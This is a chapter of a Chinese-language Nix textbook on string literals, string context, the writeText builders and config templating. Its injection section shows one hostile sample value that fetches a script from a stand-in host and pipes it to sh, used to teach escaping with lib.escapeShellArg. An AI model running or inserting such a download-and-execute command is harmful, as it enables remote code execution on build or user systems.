# 第 9 章 字符串：深入字符串上下文与模板

> **本章导读**：derivation 的名字、构建脚本、配置文件，最终都是字符串（string）。本章在双引号与 `''...''` 的基本语法之上补全细节：缩进字符串（indented string）的完整转义与空白剥离规则、URI 字面量的暗礁；字符串上下文（string context）如何让字符串「记住」自己引用过哪些 store 路径并参与哈希；拼接 shell 命令时的注入（injection）风险与转义工具。最后介绍 `pkgs.writeText` 家族——把字符串变成 store 文件的直通车，这正是 NixOS 生成 /etc 配置的底层机制（参见第 23 章）。

## 9.1 回顾与进阶：''...'' 的完整规则

第 6 章介绍过两种字符串字面量。日常读代码时那些规则够用，可一旦开始**生成**配置文件与脚本，边角规则就从「语法冷知识」变成「正确性问题」。先立一张完整的规则表。

### 9.1.1 双引号字符串快速回顾

```nix
# 双引号字符串：单行，转义以反斜杠为核心，与多数语言一致
"用 \" 转义引号，用 \\ 转义反斜杠，用 \n 表示换行"
# 阻止插值（interpolation）：写成 \${HOME}，得到的是字面文本 ${HOME}
"你家目录是 \${HOME} 这个字符串本身"
```

多行文本若用双引号书写会非常痛苦（每行一个 `\n`），这就轮到缩进字符串登场。

### 9.1.2 缩进字符串的四条规则

**规则一：剥离公共前导空白。** `''...''` 会计算所有非空行共同的最小缩进，然后从每个非空行剥掉等量的空白。于是你可以在表达式里缩进排版，产物却不含缩进：

```nix
''
  server {
    listen 80;
  }
''
# 产物（注意左侧无缩进）：
# "server {\n  listen 80;\n}\n"
```

两个容易忽略的细节：其一，**制表符（tab）既不参与计算、也不被剥离**——行首以 tab 缩进的行原样保留。写 Makefile 时这恰好是想要的，写对空白敏感的格式时则是坑。其二，空行不参与「最小缩进」的计算，也不会被修改。

**规则二：起始行的空白与换行被忽略。** 起始 `''` 之后若同一行没有其他非空白内容，其后的换行与空白全部跳过。因此上例可以直接从新行开始写正文，不必担心头部多出一个空行。

**规则三：结束 `''` 之前的换行保留。** 收尾的 `''` 通常独占一行，于是缩进字符串几乎总以 `\n` 结尾。生成不允许尾换行的文件（比如单行 token）时，用 `lib.removeSuffix "\n"` 处理（9.4 节）。

**规则四：转义用 `''` 前缀，而不是反斜杠。** 这是与双引号字符串最大的差异，也最容易记错。以官方手册为准的对照表：

| 想要的文本 | 在 ''...'' 里写 | 说明 |
|---|---|---|
| `$` | `''$` | 显式转义单个美元符号 |
| `${...}`（字面文本） | `''${...}` | 阻止插值；生成 shell 脚本时天天用 |
| `''`（两个字面单引号） | `'''` | **三个**引号产生两个字面引号 |
| 换行 / 制表 / 回车 | `''\n` / `''\t` / `''\r` | 控制字符 |
| 其他任意字符 | `''\字符` | 去掉前缀，保留该字符 |

特别澄清一个常见误解：`'''`（三个引号）才是产生字面 `''` 的写法；四个引号 `''''` 会被解析成 `'''`（得到 `''`）再带一个落单的字面 `'`，结果是三个字面引号。在 nix repl 里动手验证一分钟，胜过背十遍：

```console
$ nix repl
nix-repl> ''  '''  ''
"  ''  "
nix-repl> ''echo ''${PATH}''
"echo ${PATH}\n"
nix-repl> ''  ''''  ''
"  '''  "
```

第一例：`'''` 产出字面 `''`；第二例：`''$` 让 `${PATH}` 成为纯文本，不再被当作插值；第三例印证四个引号得到的是**三个**字面引号。这些例子同时展示了规则一（单行时无从剥离）与规则三（结尾独立成行会带来 `\n`）。

### 9.1.3 URI 字面量：方便但有暗礁

Nix 允许部分 URI（统一资源标识符，Uniform Resource Identifier）不加引号直接当字符串用。识别条件：以字母开头的方案名 scheme（可含字母、数字与 `+`、`-`、`.`），后跟 `:` 与至少一个受限字符（字母、数字及 `$%&'*+,-./:=?@_~` 等 URI 常用字符，不含空格、引号与花括号）。满足时，`https://nixos.org` 与 `"https://nixos.org"` 完全等价。

```nix
# fetchurl 场景里最常见（参见第 13 章）
src = fetchurl {
  url = https://example.org/hello-2.12.tar.gz;   # 语法上合法
  hash = "sha256-0000000000000000000000000000000000000000000000000000";
};
```

风险在于它「看起来像特殊语法，其实只是免引号的字符串」，而且边界很脆：

```nix
url = https://example.org/download?file=a b.tar.gz;
#                                             ↑ 空格不属于 URI 字符，解析直接出错
url = https://example.org/pkg-${version}.tar.gz;
#                          ↑ ${ 不是 URI 字符，同样报错——而这里你其实想要插值
```

更隐蔽的是阅读成本：评审者得先背下 URI 字符集，才能判断一个裸 token 到底是变量名还是 URL。因此惯例是**一律显式加引号**——写成 `"https://example.org/pkg-${version}.tar.gz"`，既支持插值又不留歧义。第 12 章的静态检查工具 statix 也有针对裸 URI 的检查规则（`unquoted_uri`），nixpkgs 评审同样倾向显式引号。

## 9.2 字符串上下文：会记账的字符串

### 9.2.1 文本之外，字符串还携带依赖

先看一个关键事实：把 derivation 的输出路径插值进字符串时，Nix 并不只保留文本。

```console
$ nix repl -f '<nixpkgs>'
nix-repl> s = "hello 的路径：${pkgs.hello}"
nix-repl> s
"hello 的路径：/nix/store/…-hello-2.12.1"
nix-repl> :p builtins.getContext s
{ "/nix/store/…-hello-2.12.1.drv" = { outputs = [ "out" ]; }; }
```

`s` 打印出来只是普通文本，但 `builtins.getContext` 显示它随身带着一份记录：这条字符串引用了 `hello` 的构建描述（`.drv` 文件，参见第 13 章）及其 `out` 输出。这份记录就叫**字符串上下文**（string context）。引用普通 store 文件（比如一个源码文件）时的条目形态与 derivation 不同，细节以官方手册为准。

一句话模型：**Nix 的字符串 = 文本 + context**。两段文本完全相同的字符串，可能因为 context 不同而「不是同一个字符串」。

### 9.2.2 context 参与哈希：依赖追踪的基石

context 不只是元数据。当一条带 context 的字符串进入某个 derivation——出现在环境变量、builder 参数或构建脚本里——它引用的每个 store 路径都会成为该 derivation 的输入，进而参与输出路径（outPath）的哈希计算（参见第 13、15 章）。换句话说：**「我把 hello 的路径写进了配置」这件事，会让配置依赖 hello**——哪怕最终文件里只有几十个字符的文本。

用实验验证：

```nix
# context-demo.nix —— 演示 context 如何变成 derivation 的依赖
let
  pkgs = import <nixpkgs> { };
in
pkgs.runCommand "context-demo" { } ''
  # 把 hello 的路径写进产物文件。
  # 插值的字符串携带 context，因此 hello 自动成为本 derivation 的输入——
  # 不需要（也不应该）手写在任何 inputs 列表里
  echo "editor = ${pkgs.hello}/bin/hello" > $out
''
```

```console
$ nix-build context-demo.nix
this derivation will be built:…
$ nix-store -q --references ./result
/nix/store/…-hello-2.12.1
```

`--references` 的输出里如实出现了 `hello`。如果没有 context 机制，「配置文件里引用了 hello」与「配置文件依赖 hello」就会脱钩：垃圾回收（第 19 章）可能回收 hello，留下一个指向已消失路径的配置；闭包（第 17 章）也不再完整。context 把依赖关系钉进哈希，是「构建可重现、闭包自洽」这套安全模型的组成部分。

### 9.2.3 查看与剥离：unsafeDiscardStringContext

```console
nix-repl> plain = builtins.unsafeDiscardStringContext s
nix-repl> plain == "hello 的路径：/nix/store/…-hello-2.12.1"
true
nix-repl> :p builtins.getContext plain
{ }
```

`builtins.unsafeDiscardStringContext` 返回**去掉 context 的同一文本**。函数名里的 unsafe 是故意的：剥离等于向 Nix 承诺「这些依赖真的与产物无关」。承诺错了会怎样？

```nix
# 反例：丢弃 context，依赖关系随之蒸发
pkgs.runCommand "context-demo-bad" { } ''
  echo "editor = ${builtins.unsafeDiscardStringContext pkgs.hello}/bin/hello" > $out
''
# nix-store -q --references 的结果里不再有 hello。
# 产物文本仍然写着 /nix/store/…-hello-2.12.1，
# 但没有任何机制保证这个路径还活着——GC 之后它可能已经消失
```

真实需要剥离的场景确实存在：比如生成「内容只取决于文本、不取决于依赖」的标记文件，或比较两条字符串的纯文本。但每一次使用都应像函数名提醒的那样三思。同族还有一个极少用到的 `builtins.appendContext`，可给字符串手工附加 context；知道它存在即可。

### 9.2.4 安全模型小结

context 的安全模型可以概括成一句话：**内容相同而依赖不同的字符串，不是同一个字符串。** 带不带 context，参与的哈希不同，得到的 store 路径就不同。于是你无法把「带依赖的文本」悄悄塞进一个不依赖它的构建物——那会改变哈希，等于被迫声明依赖；除非显式调用 unsafeDiscardStringContext，把责任收回自己手上。第 19 章讲垃圾回收时你会再次遇到这个机制：只要产物活着，它 context 里的路径就不会被回收。

## 9.3 生成 shell 命令与注入防护

### 9.3.1 为什么 echo "${userInput}" 危险

derivation 的构建脚本是 shell 程序（参见第 16 章），而字符串插值是**原样文本替换**。两者相加，就是经典的命令注入（command injection）：

```nix
# 反例：userInput 若为 "hi; curl evil.example/x.sh | sh"，
# 拼出的脚本就是两条命令——第二条在构建环境里原样执行
buildCommand = ''
  echo ${userInput} > $out/welcome.txt
'';
```

有人会说：构建发生在沙箱（sandbox）里，怕什么？沙箱确实降低了直接破坏的能力，但它不是借口——并非所有构建都开沙箱（部分平台不支持用户命名空间，历史配置也可能关闭沙箱），且被注入的内容可能进入产物文件、被部署到远端。注入防护的原则不应建立在「环境恰好危险度低」上。

### 9.3.2 lib.escapeShellArg 与 escapeShellArgs

nixpkgs 的 lib 给出了标准答案，思路与 Python 的 `shlex.quote` 一致：用 POSIX 单引号包裹整个参数——单引号内没有元字符，唯一的例外（单引号本身）用 `'\''` 序列「跳出—转义—回来」：

```console
nix-repl> :l <nixpkgs>
nix-repl> lib.escapeShellArg "hello world"
"'hello world'"
nix-repl> lib.escapeShellArg "it's fine"
"'it'\\''s fine'"
nix-repl> lib.escapeShellArgs [ "a b" "c" ]
"'a b' 'c'"
```

`lib.escapeShellArg :: String -> String` 处理单个参数；`lib.escapeShellArgs :: [String] -> String` 逐个转义后以空格连接，处理整个参数列表。修好上面的反例只需一行：

```nix
# 正例：先转义，再插值——无论 userInput 含什么，都只被当成一个参数
buildCommand = ''
  printf '%s\n' ${lib.escapeShellArg userInput} > $out/welcome.txt
'';
```

### 9.3.3 比转义更好的路

转义是底线，不是唯一手段。三个更稳的方向：

```nix
# 路线一：绕开 shell——writeText 直接把字符串写成文件（见 9.5 节），
# 没有 echo、没有引号嵌套，天然无注入
# 路线二：占位符替换——substituteInPlace 把脚本里的 @占位符@ 换成 store 路径。
# 替换是纯文本操作，不经过 shell 解析，也没有注入问题；
# 它是 stdenv fixup 阶段的常客（参见第 33 章）
postPatch = ''
  substituteInPlace bin/mytool --subst-var-by curl ${pkgs.curl}/bin/curl
'';
# 路线三：用环境变量传值——动态内容放进 derivation 的环境属性，
# 构建脚本里以 "$VAR" 读取。环境变量的值不参与 shell 语法解析，
# 内容里再有分号也只是一个普通字符串
```

## 9.4 lib.strings 工具箱

手写字符串处理之前，先翻一遍 `lib.strings`——多数需求已有现成且被数万个包验证过的实现。以下是最常用的一批（完整清单以 nixpkgs 手册为准）：

| 函数 | 类型 / 形式 | 一句话 |
|---|---|---|
| `concatStringsSep` | 分隔符 → 列表 → 字符串 | 列表转字符串的标准姿势 |
| `concatMapStringsSep` | 分隔符 → 函数 → 列表 | 先映射再拼接 |
| `optionalString` | 条件 → 字符串 | 真返回原文，假返回空串 |
| `replaceStrings` | 旧列表 → 新列表 → 字符串 | 逐对全量替换 |
| `splitString` | 分隔符 → 字符串 | 按**字面**分隔符拆分 |
| `builtins.split` | 正则 → 字符串 | 按**正则**拆分（注意返回结构） |
| `toLower` / `toUpper` | 字符串 | ASCII 大小写转换 |
| `trim` | 字符串 | 去两端空白 |
| `hasPrefix` / `hasSuffix` | 前后缀 → 字符串 | 判断 |
| `removePrefix` / `removeSuffix` | 前后缀 → 字符串 | 移除 |
| `versionAtLeast` / `versionOlder` / `compareVersions` | 版本 → 版本 | 版本比较 |

逐个看例子（可在 nix repl 里直接验证）：

```nix
# —— 拼接 ——
lib.concatStringsSep "," [ "a" "b" "c" ]            # "a,b,c"

# 先映射再拼接：生成配置行、命令行参数的黄金组合
lib.concatMapStringsSep "\n" (n: "server ${n};") [ "s1" "s2" ]
# "server s1;\nserver s2;"

# —— 条件字符串 ——
# 为真返回字符串本身，为假返回空串 ""（注意不是 null）
lib.optionalString pkgs.stdenv.isLinux "export OS=linux\n"

# —— 替换 ——
# from 与 to 按下标配对；已替换出的文本不会再次被扫描
lib.replaceStrings [ ".tar.gz" ] [ ".tar.xz" ] "hello-2.12.tar.gz"
# "hello-2.12.tar.xz"

# —— 拆分 ——
# lib.splitString：按「字面分隔符」拆分，最常用
lib.splitString ":" "/usr/bin:/bin"                  # [ "/usr/bin" "/bin" ]

# builtins.split：按「扩展正则表达式」拆分。
# 返回的是「非匹配片段 与 捕获组列表」交错的结构，不是普通字符串列表！
builtins.split "([ab])" "a1b2"
# [ "" [ "a" ] "1" [ "b" ] "2" ]

# —— 大小写与修剪 ——
lib.toLower "Hello"      # "hello"（仅处理 ASCII 字母，非 ASCII 原样保留）
lib.toUpper "hello"      # "HELLO"
lib.trim "  hi  "        # "hi"（去除两端空白）

# —— 前后缀 ——
lib.hasPrefix "v" "v1.2.3"          # true
lib.hasSuffix ".gz" "a.tar.gz"      # true
lib.removePrefix "v" "v1.2.3"       # "1.2.3"
lib.removeSuffix ".gz" "a.tar.gz"   # "a.tar"
# removePrefix/removeSuffix 假定前后缀确实存在；需要容错时先 hasPrefix/hasSuffix 判断
```

**版本比较**值得单独强调，它在 nixpkgs 里无处不在：

```nix
lib.versionOlder "1.0" "1.0.1"     # true：1.0 旧于 1.0.1
lib.versionAtLeast "3.0" "2.9"     # true
lib.compareVersions "1.0" "1.0.1"  # -1（更旧）/ 0（相同）/ 1（更新）
```

nixpkgs 的版本比较按 `.` 分段、数字段按数值比较，并对 `pre`、`rc` 等发布风格有特殊处理；完整规则以 lib 文档与源码为准。典型用法（第 12 章会展开 assert）：

```nix
# 打包时声明版本契约：太旧就别往下走
assert lib.versionAtLeast openssl.version "3.0";
```

## 9.5 从字符串到文件：writeText 家族

字符串要影响系统，最终得变成 store 里的文件。`pkgs.writeText` 家族就是「字符串 → store 文件」的直通车，全部基于一类叫 trivial builder（简单构建器）的设施——它们不编译任何东西，只把文本写进 store。

### 9.5.1 writeText 与 writeTextFile

```nix
# 最简形式：名字 + 内容，产出一个普通文件
pkgs.writeText "motd.txt" "欢迎来到这台机器\n"
# 产物路径形如 /nix/store/<哈希>-motd.txt（一个文件，不是目录）
```

通用形式是 `writeTextFile`，参数逐行注释：

```nix
pkgs.writeTextFile {
  # 名字进入 store 路径：/nix/store/<哈希>-motd
  name = "motd";
  # 文件内容；内含 store 路径的插值会因 context 被正确记为依赖（9.2 节）
  text = "欢迎\n";
  # 是否设置可执行位；默认 false
  executable = false;
  # 为空时产物就是 $out 这个文件本身；
  # 设为 "/etc/motd" 时产物是目录，内容位于 $out/etc/motd
  destination = "";
  # 构建期校验钩子：非零退出则整个文件不进 store。
  # 常用来跑配置语法检查，把错误拦在构建时而非运行时
  checkPhase = "";
}
```

### 9.5.2 脚本三兄弟：writeShellScript / writeShellScriptBin / writeScriptBin

```nix
# writeShellScript：自动补上 #!/nix/store/…-bash 头（解释器即 pkgs.runtimeShell），
# 构建时还会对脚本做语法检查——拼错一行当场报错，而不是部署后才发现
pkgs.writeShellScript "backup-db" ''
  set -euo pipefail
  pg_dump example > backup.sql
''

# writeShellScriptBin：内容相同，但产物是目录 /nix/store/<哈希>-<名字>/bin/<名字>，
# 因此整个 derivation 可以直接进 packages 列表（参见第 24 章）
pkgs.writeShellScriptBin "backup-db" ''
  set -euo pipefail
  pg_dump example > backup.sql
''

# writeScriptBin：同样产出 bin/<名字>，但 shebang 由你自己写——
# 需要指定 python、awk 等其它解释器时用它，并把解释器钉在 store 路径上
pkgs.writeScriptBin "gen-report" ''
  #!${pkgs.python3}/bin/python3
  # ↑ 解释器固定为 store 里的 python3，不依赖运行环境碰巧装了什么
  print("hello from python")
''
```

产物路径形态一眼记（哈希以 … 代替）：

```console
$ nix-build -E 'with import <nixpkgs> { }; writeText "demo.txt" "hi"'
/nix/store/…-demo.txt
$ nix-build -E 'with import <nixpkgs> { }; writeShellScriptBin "demo" "echo hi"'
/nix/store/…-demo
$ ls ./result/bin
demo
```

一个容易忽略的坑：writeShellScript 生成的脚本**不会自动获得依赖的 PATH**。脚本里裸写 `jq` 能否工作，取决于运行它的环境；要自包含，就在脚本里写绝对路径，或用 `lib.makeBinPath` 拼一个 PATH（第 12 章），或用 `makeWrapper` 包装。

为什么说这是 NixOS 的基础机制：`environment.etc` 写的配置、systemd 单元文件、activation 脚本（第 26 章），底层都靠这一族函数把 Nix 表达式里的字符串变成 store 里的真实文件，再链接进系统（第 23、29 章）。你现在掌握的每一个细节，之后都会在 NixOS 里再次出现。

## 9.6 实战：生成一份 nginx upstream 配置

目标：给定「服务名 → { 端口, 服务器列表 }」的数据，生成 nginx 的 upstream 配置片段。

```nix
# nginx-upstreams.nix —— 用字符串模板从属性集生成配置
{ lib, ... }:
let
  # 纯数据：服务清单。真实项目里它可能来自另一个模块的 config（第 25 章）
  upstreams = {
    api = { port = 8080; servers = [ "10.0.0.11" "10.0.0.12" ]; };
    web = { port = 8081; servers = [ "10.0.0.21" ]; };
  };

  # 纯模板：单个 upstream 块。
  # server 行由 concatMapStringsSep 生成——嵌套列表同样一句话展开；
  # toString 把整数端口转成字符串（Nix 不会隐式转换）
  upstreamBlock = name: u: ''
    upstream ${name} {
      ${lib.concatMapStringsSep "\n" (s: "server ${s}:${toString u.port};") u.servers}
    }
  '';

  # 标准组合拳：mapAttrsToList 把属性集摊平成块，再用 "\n" 缝合
  upstreamConf =
    lib.concatStringsSep "\n" (lib.mapAttrsToList upstreamBlock upstreams);
in
{
  # 直接作为 /etc/nginx/upstreams-extra.conf 的内容（参见第 24 章）
  environment.etc."nginx/upstreams-extra.conf".text = upstreamConf;
}
```

生成的文本（缩进由 `''...''` 的剥离规则保证）：

```nginx
upstream api {
  server 10.0.0.11:8080;
  server 10.0.0.12:8080;
}

upstream web {
  server 10.0.0.21:8081;
}
```

三个值得记住的实践点：

1. **数据与模板分离**。`upstreams` 是纯数据，`upstreamBlock` 是纯模板；两者可以独立修改、独立测试。承载纯数据的最佳结构就是属性集（第 10 章）。
2. **`mapAttrsToList + concatStringsSep` 是「属性集 → 文本」的标准管道**。mapAttrsToList 按属性名顺序（第 10 章会解释为何顺序稳定）产出块，concatStringsSep 负责缝合；两步都纯函数，改数据不需碰模板。
3. **值的来源决定要不要转义**。本例的值来自受信任的模块配置，直接插值可接受；一旦数据可能来自用户输入或外部系统，nginx 并没有内置转义器，必须在上游约束格式（如只允许 IP、端口、域名），否则插值就是注入点——这是 9.3 节原则在配置生成场景的翻版。

### 9.6.1 替代方案：lib.generators.toINI

手写模板适合 nginx 这类非标准格式；**标准格式则应交给生成器**（generators）：

```nix
lib.generators.toINI { } {
  session = {
    buffer_size = 1024;
    debug = false;
  }
}
# 产物（键值格式、布尔小写、引号等细节都由库负责）：
# [session]
# buffer_size=1024
# debug=false
```

generators 家族还有 `toYAML`、`toJSON`、`toTOML`、`toKeyValue` 等。它们把「格式细节」从业务代码里挪走，还能与模块系统的 `types.attrsOf` 配合，让用户以类型安全的方式声明任意配置节——第 43 章编写 NixOS 模块时会用到这套组合。

## 9.7 本章小结

- `''...''` 四条规则：剥离公共最小缩进（tab 除外）、起始行换行忽略、结束前换行保留、转义用 `''` 前缀；`'''` 产生字面 `''`，`''${` 阻止插值。
- URI 字面量只是免引号的字符串：字符集受限、边界易碎，建议一律显式加引号。
- 字符串 = 文本 + context：`builtins.getContext` 查看、`unsafeDiscardStringContext` 剥离；context 参与 derivation 哈希，是依赖追踪与闭包完整性的基石。
- 剥离 context 等于承诺「文本与依赖无关」；错误承诺会让产物引用不在闭包内的路径，GC 后指向虚空。
- 拼 shell 必须转义：`lib.escapeShellArg` / `escapeShellArgs`；更稳的路是 writeText、substituteAll 与环境变量传值。
- lib.strings 覆盖拼接、条件、替换、拆分、前后缀与版本比较；拆分记住「splitString 字面、builtins.split 正则」的分工。
- writeText 家族把字符串落成 store 文件与脚本，产物形态（文件 / bin 目录）各有分工，是 NixOS 生成配置的底层机制。
- 标准格式优先用 lib.generators，把格式细节交给库，业务代码只留数据。

## 延伸阅读

- Nix 手册 · 字符串字面量：https://nix.dev/manual/nix/stable/language/string-literals
- Nix 手册 · 内建函数（getContext、split 等）：https://nix.dev/manual/nix/stable/language/builtins
- nixpkgs 手册 · lib.strings：https://nixos.org/manual/nixpkgs/stable/#sec-functions-library-string
- nixpkgs 手册 · trivial builders（writeText 家族）：https://nixos.org/manual/nixpkgs/stable/#sec-trivial-builders
- nix.dev · Nix 语言教程：https://nix.dev/tutorials/nix-language
